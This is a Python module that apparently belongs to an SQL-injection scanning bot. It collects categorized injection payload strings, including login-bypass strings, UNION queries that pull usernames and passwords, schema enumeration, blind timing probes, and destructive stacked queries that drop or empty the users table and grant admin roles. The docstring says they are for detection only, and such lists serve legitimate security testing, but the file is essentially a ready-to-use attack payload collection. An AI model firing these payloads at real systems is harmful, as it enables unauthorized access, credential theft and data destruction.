"""
payload_library.py
------------------
Central repository of SQL Injection payloads organized by attack category.
All payloads are strings intended for **detection only** — the bot never
executes destructive queries on a real database.
"""

from dataclasses import dataclass, field
from typing import Dict, List


@dataclass
class PayloadCategory:
    """A named group of SQL-injection payloads."""
    name: str
    description: str
    payloads: List[str] = field(default_factory=list)


# ── Authentication-bypass payloads ────────────────────────────────────────
AUTH_BYPASS_PAYLOADS = PayloadCategory(
    name="Authentication Bypass",
    description="Payloads that attempt to bypass login forms by altering WHERE clauses.",
    payloads=[
        "' OR 1=1 --",
        "' OR 'a'='a",
        "admin' --",
        "' OR '1'='1' --",
        "' OR ''='",
        "1' OR '1'='1",
        "') OR ('1'='1",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'/*",
        "' OR 1=1 -- -",
        "\" OR 1=1 --",
        "\" OR \"\"=\"",
        "' OR 'x'='x",
        "') OR ('x'='x",
    ],
)

# ── Union-based injection payloads ────────────────────────────────────────
UNION_PAYLOADS = PayloadCategory(
    name="Union-Based Injection",
    description="Payloads using UNION SELECT to extract data from other tables.",
    payloads=[
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL,NULL --",
        "' UNION SELECT username,password FROM users --",
        "' UNION SELECT 1,2 --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1,2,3,4 --",
        "' UNION ALL SELECT NULL --",
        "' UNION ALL SELECT NULL,NULL --",
        "' UNION ALL SELECT NULL,NULL,NULL --",
    ],
)

# ── Database-information payloads ─────────────────────────────────────────
DB_INFO_PAYLOADS = PayloadCategory(
    name="Database Information Extraction",
    description="Payloads that retrieve schema metadata (table names, columns, etc.).",
    payloads=[
        "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns --",
        "' UNION SELECT table_name,NULL FROM information_schema.tables --",
        "' UNION SELECT NULL,table_name FROM information_schema.tables --",
        "' UNION SELECT sql,NULL FROM sqlite_master --",
        "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --",
        "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables --",
    ],
)

# ── Time-based blind payloads ─────────────────────────────────────────────
TIME_BASED_PAYLOADS = PayloadCategory(
    name="Time-Based Blind Injection",
    description="Payloads that use database SLEEP / delay functions to confirm injection.",
    payloads=[
        "' OR SLEEP(5) --",
        "' OR SLEEP(3) --",
        "'; WAITFOR DELAY '0:0:5' --",
        "' OR BENCHMARK(10000000,SHA1('test')) --",
        "1' AND SLEEP(5) --",
        "1' AND SLEEP(3) --",
        "' OR (SELECT SLEEP(5)) --",
    ],
)

# ── Boolean-based blind payloads ──────────────────────────────────────────
BOOLEAN_PAYLOADS = PayloadCategory(
    name="Boolean-Based Blind Injection",
    description="Payloads that infer data from True / False response differences.",
    payloads=[
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND 'a'='a' --",
        "' AND 'a'='b' --",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "' AND (SELECT COUNT(*) FROM users)>0 --",
        "' AND SUBSTRING(username,1,1)='a' FROM users --",
    ],
)

# ── Privilege-escalation simulation payloads ──────────────────────────────
PRIVILEGE_ESCALATION_PAYLOADS = PayloadCategory(
    name="Privilege Escalation",
    description="Payloads that test whether UPDATE-style queries could alter roles.",
    payloads=[
        "'; UPDATE users SET role='admin' WHERE username='attacker' --",
        "'; UPDATE users SET role='admin' WHERE 1=1 --",
        "'; UPDATE users SET is_admin=1 WHERE username='attacker' --",
    ],
)

# ── Data-deletion simulation payloads ─────────────────────────────────────
DATA_DELETION_PAYLOADS = PayloadCategory(
    name="Data Deletion",
    description="Payloads that test whether DELETE queries could be chained.",
    payloads=[
        "'; DELETE FROM users --",
        "'; DELETE FROM users WHERE 1=1 --",
        "'; DELETE FROM sessions --",
    ],
)

# ── Table-drop simulation payloads ────────────────────────────────────────
TABLE_DROP_PAYLOADS = PayloadCategory(
    name="Table Drop",
    description="Payloads that test whether DROP TABLE could be executed.",
    payloads=[
        "'; DROP TABLE users --",
        "'; DROP TABLE sessions --",
        "'; DROP TABLE IF EXISTS users --",
    ],
)

# ── Data-insertion simulation payloads ────────────────────────────────────
DATA_INSERT_PAYLOADS = PayloadCategory(
    name="Malicious Data Insertion",
    description="Payloads that test whether INSERT queries could inject rows.",
    payloads=[
        "'; INSERT INTO users (username,password,role) VALUES ('hacker','hacked','admin') --",
        "'; INSERT INTO users VALUES (99,'hacker','hacked','admin') --",
    ],
)

# ── Error-based payloads ─────────────────────────────────────────────────
ERROR_BASED_PAYLOADS = PayloadCategory(
    name="Error-Based Injection",
    description="Payloads that force the database to return error messages leaking info.",
    payloads=[
        "'",
        "''",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    ],
)


# ── Convenience helpers ──────────────────────────────────────────────────

ALL_CATEGORIES: List[PayloadCategory] = [
    AUTH_BYPASS_PAYLOADS,
    UNION_PAYLOADS,
    DB_INFO_PAYLOADS,
    TIME_BASED_PAYLOADS,
    BOOLEAN_PAYLOADS,
    PRIVILEGE_ESCALATION_PAYLOADS,
    DATA_DELETION_PAYLOADS,
    TABLE_DROP_PAYLOADS,
    DATA_INSERT_PAYLOADS,
    ERROR_BASED_PAYLOADS,
]


def get_all_payloads() -> Dict[str, List[str]]:
    """Return every category as ``{category_name: [payloads]}``."""
    return {cat.name: cat.payloads for cat in ALL_CATEGORIES}


def get_payloads_by_category(name: str) -> List[str]:
    """Return payloads for a single category by name (case-insensitive)."""
    for cat in ALL_CATEGORIES:
        if cat.name.lower() == name.lower():
            return cat.payloads
    return []


def get_category_names() -> List[str]:
    """Return the names of all payload categories."""
    return [cat.name for cat in ALL_CATEGORIES]
